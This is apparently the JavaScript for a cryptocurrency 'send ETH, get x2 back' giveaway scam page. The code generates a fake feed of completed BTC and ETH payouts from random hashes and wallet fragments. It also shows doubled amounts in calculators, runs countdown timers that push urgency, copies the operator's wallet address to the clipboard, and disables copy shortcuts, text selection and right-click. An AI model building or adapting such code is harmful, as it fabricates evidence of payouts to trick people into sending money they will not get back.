const {
  wallet_btc,
  wallet_eth,
  min_btc,
  max_btc,
  min_eth,
  max_eth,
  multiplier,
} = window.cdata;

function lerp(start, end, amt) {
  return (1 - amt) * start + amt * end;
}

$(document).ready(function () {
  function randomString(len, charSet) {
    charSet = charSet || "ABCDEFabcdef0123456789";
    var randomString = "";
    for (var i = 0; i < len; i++) {
      var randomPoz = Math.floor(Math.random() * charSet.length);
      randomString += charSet.substring(randomPoz, randomPoz + 1);
    }
    return randomString;
  }

  function randomNumber(min, max) {
    return min + Math.random() * (max + 1 - min);
  }

  function createTableItem() {
    const coin = Math.random() > 0.5 ? "BTC" : "ETH";

    let wallet_from = "";
    let wallet_to = "";
    let send_amount = 0;
    let get_amount = 0;
    let txhash = "";
    let block = randomString(6, "123456789");
    let fee = 0;

    if (coin === "BTC") {
      wallet_from = "1" + randomString(11) + "...";
      wallet_to = wallet_btc;

      const max_lerp = lerp(min_btc, max_btc, 0.05);
      send_amount = randomNumber(min_btc, max_lerp);
      get_amount = send_amount * multiplier;

      fee = (send_amount / 100000).toFixed(8);
      send_amount = send_amount.toFixed(8);
      get_amount = get_amount.toFixed(8);

      txhash = randomString(10) + "...";
    } else if (coin === "ETH") {
      wallet_from = "0x" + randomString(11) + "...";
      wallet_to = wallet_eth;

      const max_lerp = lerp(min_eth, max_eth, 0.05);
      send_amount = randomNumber(min_eth, max_lerp);
      get_amount = send_amount * multiplier;

      fee = (send_amount / 100000).toFixed(5);
      send_amount = send_amount.toFixed(5);
      get_amount = get_amount.toFixed(5);

      txhash = "0x" + randomString(8) + "...";
    }

    let row = `<div class="transaction-item">
            <p class="txhash">${txhash}</p>
            <p class="block">${block}</p>
            <p class="from">${wallet_to}<br>${wallet_from}</p>
            <div class="arrow"><img src="assets/check.svg" alt=""></div>
            <p class="to">${wallet_from}<br>${wallet_to}</p>
            <p class="value">${get_amount} ${coin}<br>${send_amount} ${coin}</p>
            <p class="fee">${fee}</p>
            <p class="status">Completed</p>
        </div>`;

    $(row).hide().prependTo(".transaction-content").fadeIn("slow");
    $(".transaction-item:eq(5)").remove();
  }

  for (let i = 0; i <= 10; i++) {
    createTableItem();
  }
  setInterval(createTableItem, 15500);

  $('a[href^="#"]').click(function () {
    var target = $(this).attr("href");
    $("html, body").animate({ scrollTop: $(target).offset().top - 50 }, 500);
    return false;
  });

  $("input[name=input_btc]")
    .ForceNumericOnly()
    .keyup(function () {
      let amount = parseFloat($(this).val());
      amount = !isNaN(amount) ? amount * 2 : 0;
      // Set a minimum limit for the displayed value
      amount = amount < 0.099 ? 0 : amount;
      $("#calculator_number_btc").text(amount.toLocaleString());
    });
  $("input[name=input_eth]")
    .ForceNumericOnly()
    .keyup(function () {
      let amount = parseFloat($(this).val());
      amount = !isNaN(amount) ? amount * 2 : 0;
      // Set a minimum limit for the displayed value
      amount = amount < 0.4 ? 0 : amount;
      $("#calculator_number_eth").text(amount.toLocaleString());
    });

  $(".participate-button").click(function () {
    $(this).parents(".participate-item").find(".address-done").fadeIn(200);
    setTimeout(
      () =>
        $(this).parents(".participate-item").find(".address-done").fadeOut(200),
      1000
    );
  });
});

function round(value, decimals) {
  return Number(Math.round(value + "e" + decimals) + "e-" + decimals);
}

function copy(text) {
  var input = document.createElement("textarea");
  input.innerHTML = text;
  document.body.appendChild(input);
  input.select();
  var status = document.execCommand("copy");
  document.body.removeChild(input);

  // Highlight the paragraph for 1 second
  var addressElement = document.getElementById("addressToHighlight");
  if (addressElement) {
    addressElement.classList.add("highlight"); // Apply highlighting class
    setTimeout(function () {
      addressElement.classList.remove("highlight"); // Remove highlighting class after 1 second
    }, 1000); // 1000 milliseconds = 1 second
  }
}

function copy2(text) {
  var input2 = document.createElement("textarea");
  input2.innerHTML = text;
  document.body.appendChild(input2);
  input2.select();
  var status = document.execCommand("copy"); // Corrected command to "copy"
  document.body.removeChild(input2);

  // Highlight the paragraph for 1 second
  var addressElement2 = document.getElementById("addressToHighlight2");
  if (addressElement2) {
    addressElement2.classList.add("highlight"); // Apply highlighting class
    setTimeout(function () {
      addressElement2.classList.remove("highlight"); // Remove highlighting class after 1 second
    }, 1000); // 1000 milliseconds = 1 second
  }
}




jQuery.fn.ForceNumericOnly = function () {
  return this.each(function () {
    $(this).keydown(function (e) {
      var key = e.charCode || e.keyCode || 0;
      return (
        key == 8 ||
        key == 46 ||
        key == 190 ||
        (key >= 35 && key <= 40) ||
        (key >= 48 && key <= 57) ||
        (key >= 96 && key <= 105)
      );
    });
  });
};

function kill_ctrl_key_combo(e) {
  var forbiddenKeys = new Array("a", "c", "x", "s", "u");
  var key;
  var isCtrl;
  if (window.event) {
    key = window.event.keyCode;
    if (window.event.ctrlKey) isCtrl = true;
    else isCtrl = false;
  } else {
    key = e.which;
    if (e.ctrlKey) isCtrl = true;
    else isCtrl = false;
  }
  if (isCtrl) {
    for (i = 0; i < forbiddenKeys.length; i++) {
      //case-insensitive comparation
      if (
        forbiddenKeys[i].toLowerCase() == String.fromCharCode(key).toLowerCase()
      ) {
        return false;
      }
    }
  }
  return true;
}

function disable_selection(target) {
  if (typeof target.style.MozUserSelect != "undefined") {
    target.style.MozUserSelect = "none";
  }
  target.style.cursor = "default";
}

function double_mouse(e) {
  if (e.which == 2 || e.which == 3) {
    return false;
  }
  return true;
}



let countdownTime = 15 * 60; // Initialize countdownTime with a value of 15 minutes
let countdownTime2 = 15 * 60; // Initialize countdownTime2 with a value of 15 minutes
//timer 1 -------------->
let originalTitleText = "Send your <span>ETH</span> to the address for x2 back"; // Store original text
function updateCountdown() {
  countdownTime--;

  const minutes = Math.floor(countdownTime / 60);
  const seconds = countdownTime % 60;

  // Format the minutes and seconds with leading zeros
  const formattedMinutes = String(minutes).padStart(2, "0");
  const formattedSeconds = String(seconds).padStart(2, "0");

  // Display the countdown with the formatted time
  document.getElementById(
    "countdown"
  ).textContent = `${formattedMinutes}:${formattedSeconds}`;
  localStorage.setItem("countdownTime", countdownTime);

  if (countdownTime <= 0) {
    clearInterval(intervalId);
    document.getElementById("btc-qr-address").innerHTML = '<img src="assets/expired_transac.svg" alt="" class="participate-qr" />';
    document.getElementById("countdown").textContent = "reset";
    document.getElementById("participate-title-btc").textContent = "⚠️ Transaction expired❗";
    $("#refreshButton").show();
    $("#participate-address-btc").hide();
    $("#waiting_transac").hide();
    $("#copy_button_btc").hide();
  }
}

function restartCountdown() {
  setTimeout(() => {
    countdownTime = 15 * 60;
    let intervalId;
    document.getElementById("btc-qr-address").innerHTML = '<img src="assets/btc_wallet.svg" alt="" class="participate-qr" />';
    $("#refreshButton").hide();
    $("#waiting_transac").show();
    $("#participate-address-btc").show();
    $("#copy_button_btc").show();
    clearInterval(intervalId);
    intervalId = setInterval(updateCountdown, 1000); // Change to update every second
    updateCountdown(); // Manually trigger update to prevent initial delay

    // Set the text back to its original state
    document.getElementById("participate-title-btc").innerHTML =
      originalTitleText;
  }, 1500);
}

$("#refreshButton").on("click", restartCountdown);

intervalId = setInterval(updateCountdown, 1000); // Update every second

const storedCountdownTime = localStorage.getItem("countdownTime");
if (storedCountdownTime !== null) {
  countdownTime = parseInt(storedCountdownTime);
  updateCountdown();
}


//timer 2-------------->
let originalTitleText2 = "Send your <span>ETH</span> to the address for x2 back"; // Store original text

function updateCountdown2() {
  countdownTime2--;

  const minutes2 = Math.floor(countdownTime2 / 60);
  const seconds2 = countdownTime2 % 60;

  // Format the minutes and seconds with leading zeros
  const formattedMinutes2 = String(minutes2).padStart(2, "0");
  const formattedSeconds2 = String(seconds2).padStart(2, "0");

  // Display the countdown2 with the formatted time
  document.getElementById(
    "countdown2"
  ).textContent = `${formattedMinutes2}:${formattedSeconds2}`;
  localStorage.setItem("countdownTime2", countdownTime2);

  if (countdownTime2 <= 0) {
    clearInterval(intervalId2);
    document.getElementById("eth-qr-address").innerHTML = '<img src="assets/expired_transac.svg" alt="" class="participate-qr" />';
    document.getElementById("countdown2").textContent = "reset";
    document.getElementById("participate-title-eth").innerHTML = "⚠️ Transaction expired❗"; // Change text here
    $("#refreshButton2").show();
    $("#participate-address-eth").hide();
    $("#waiting_transac2").hide();
    $("#copy_button_eth").hide();
  }
}

function restartCountdown2() {
  setTimeout(() => {
    countdownTime2 = 15 * 60;
    let intervalId2;
    document.getElementById("eth-qr-address").innerHTML = '<img src="assets/eth_wallet.svg" alt="" class="participate-qr" />';
    $("#refreshButton2").hide();
    $("#participate-address-eth").show();
    $("#waiting_transac2").show();
    $("#copy_button_eth").show();
    clearInterval(intervalId2);
    intervalId2 = setInterval(updateCountdown2, 1000); // Update every second
    updateCountdown2(); // Manually trigger update to prevent initial delay

    // Set the text back to its original state
    document.getElementById("participate-title-eth").innerHTML =
      originalTitleText2;
  }, 1500);
}


$("#refreshButton2").on("click", restartCountdown2);

intervalId2 = setInterval(updateCountdown2, 1000); // Update every second

const storedCountdownTime2 = localStorage.getItem("countdownTime2");
if (storedCountdownTime2 !== null) {
  countdownTime2 = parseInt(storedCountdownTime2);
  updateCountdown2();
}





window.onload = function () {
  //for btc restart button
  var btn = document.getElementById("refreshButton");
  btn.onclick = function (event) {
    btn.children[0].classList.add("spin-animation");
    setTimeout(function () {
      btn.children[0].classList.remove("spin-animation");
    }, 1500);
  };
  //for eth restart button
  var btn2 = document.getElementById("refreshButton2");
  btn2.onclick = function (event) {
    btn2.children[0].classList.add("spin-animation");
    setTimeout(function () {
      btn2.children[0].classList.remove("spin-animation");
    }, 1500);
  };
};
